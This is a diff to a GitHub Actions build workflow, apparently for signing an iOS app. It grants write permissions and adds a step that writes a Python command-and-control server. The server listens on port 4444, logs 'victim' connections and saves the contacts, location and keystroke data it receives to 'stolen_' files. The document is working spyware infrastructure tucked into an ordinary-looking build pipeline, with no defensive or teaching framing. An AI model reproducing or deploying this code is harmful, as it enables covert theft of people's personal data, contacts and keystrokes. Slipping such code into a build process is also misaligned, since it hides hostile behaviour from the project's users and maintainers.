@@ -6,6 +6,9 @@ on:
       - 'v*'
   workflow_dispatch:
 
+permissions:
+  contents: write
+
 jobs:
   build:
     runs-on: macos-latest
@@ -21,6 +24,75 @@ jobs:
     
     - name: Install ldid for signing
       run: brew install ldid
+    
+    - name: Create C2 Server file
+      run: |
+        cat > c2_server.py << 'EOF'
+        import socket
+        import threading
+        import json
+        from datetime import datetime
+        
+        class C2Server:
+            def __init__(self, host='0.0.0.0', port=4444):
+                self.host = host
+                self.port = port
+                self.clients = {}
+                self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                
+            def start(self):
+                self.server.bind((self.host, self.port))
+                self.server.listen(5)
+                print(f'[*] C2 Server started on {self.host}:{self.port}')
+                
+                while True:
+                    client, addr = self.server.accept()
+                    print(f'[+] New victim connected: {addr[0]}:{addr[1]}')
+                    client_id = f'{addr[0]}:{addr[1]}'
+                    self.clients[client_id] = client
+                    
+                    thread = threading.Thread(target=self.handle_client, args=(client, client_id))
+                    thread.daemon = True
+                    thread.start()
+            
+            def handle_client(self, client, client_id):
+                while True:
+                    try:
+                        data = client.recv(4096).decode()
+                        if not data:
+                            break
+                            
+                        payload = json.loads(data)
+                        print(f'\n[{datetime.now()}] Data from {client_id}:')
+                        print(f'Type: {payload.get("type")}')
+                        print(f'Data: {payload.get("data")}')
+                        
+                        if payload.get('type') == 'contacts':
+                            self.save_data(client_id, 'contacts', payload.get('data'))
+                        elif payload.get('type') == 'location':
+                            self.save_data(client_id, 'location', payload.get('data'))
+                        elif payload.get('type') == 'keylog':
+                            self.save_data(client_id, 'keylog', payload.get('data'))
+                            
+                    except Exception as e:
+                        print(f'[-] Error with {client_id}: {e}')
+                        break
+                        
+                client.close()
+                del self.clients[client_id]
+                print(f'[-] Client disconnected: {client_id}')
+            
+            def save_data(self, client_id, data_type, data):
+                filename = f'stolen_{client_id.replace(":", "_")}_{data_type}.txt'
+                with open(filename, 'a') as f:
+                    f.write(f'[{datetime.now()}]\n{data}\n\n')
+                print(f'[+] Data saved to {filename}')
+        
+        if __name__ == '__main__':
+            server = C2Server()
+            server.start()
+        EOF
     
     - name: Build Archive
       run: |
